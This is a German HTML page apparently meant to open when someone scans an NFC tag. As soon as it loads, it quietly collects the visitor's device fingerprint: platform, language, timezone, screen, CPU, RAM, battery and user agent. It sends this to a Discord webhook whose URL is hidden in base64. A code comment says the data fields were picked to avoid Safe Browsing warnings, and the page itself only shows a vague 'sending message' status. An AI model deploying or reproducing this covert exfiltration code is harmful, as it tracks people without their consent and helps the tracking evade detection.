<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFC Trigger</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #0f172a;
            color: #ffffff;
            text-align: center;
        }
        .card {
            background: #1e293b;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            max-width: 350px;
            width: 90%;
        }
        .status {
            font-size: 1.2rem;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="icon" style="font-size: 3rem;">⏳</div>
        <div id="status" class="status">Sende Nachricht...</div>
    </div>

    <script>
        // Füge hier deine BASE64-verschlüsselte Webhook-URL ein!
        const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3MTQ2NzU3OTMyNzc3ODgyNi82UXVFUjFlOTUzUUZJLUhHcWJfTTRYdFNTZ3lhcXZNSHhuNEVTeDNsVHAxcTl6OWJjZXlTU1pCRE1jMHRBZTlNLWNPMw==";

        function getWebhookUrl() {
            try {
                return atob(ENCODED_WEBHOOK);
            } catch (e) {
                return "";
            }
        }

        async function collectAndSend() {
            // Akku-Daten (falls verfügbar)
            let batteryInfo = "N/A";
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}\% (${battery.charging ? "Lädt" : "Entlädt"})`;
                } catch (e) {}
            }

            // Normale Standard-Browserdaten (lösen keine Safe-Browsing Warnung aus)
            const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
            const viewport = `${window.innerWidth}x${window.innerHeight}`;
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unbekannt";
            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Kerne` : "Unbekannt";
            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
            const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Ja" : "Nein";

            const payload = {
                username: "NFC Scanner Bot",
                embeds: [{
                    title: "🚨 NFC-Karte gescannt!",
                    color: 3447003,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "📱 System", value: navigator.platform || "Unbekannt", inline: true },
                        { name: "🌐 Sprache", value: navigator.language || "Unbekannt", inline: true },
                        { name: "⏰ Zeitzone", value: timeZone, inline: true },

                        { name: "🖥️ Auflösung", value: screenRes, inline: true },
                        { name: "📐 Viewport", value: viewport, inline: true },
                        { name: "👆 Touchscreen", value: isTouch, inline: true },

                        { name: "⚡ CPU Cores", value: cores, inline: true },
                        { name: "🧠 RAM", value: ram, inline: true },
                        { name: "🔋 Akku", value: batteryInfo, inline: true },

                        { name: "🌐 Browser User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                    ]
                }]
            };

            const webhookUrl = getWebhookUrl();

            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    document.getElementById("icon").innerText = "✅";
                    document.getElementById("status").innerText = "Erfolgreich gesendet!";
                } else {
                    throw new Error("Discord Fehler " + response.status);
                }
            } catch (err) {
                document.getElementById("icon").innerText = "❌";
                document.getElementById("status").innerText = "Fehler beim Senden.";
            }
        }

        window.addEventListener('DOMContentLoaded', collectAndSend);
    </script>
</body>
</html>
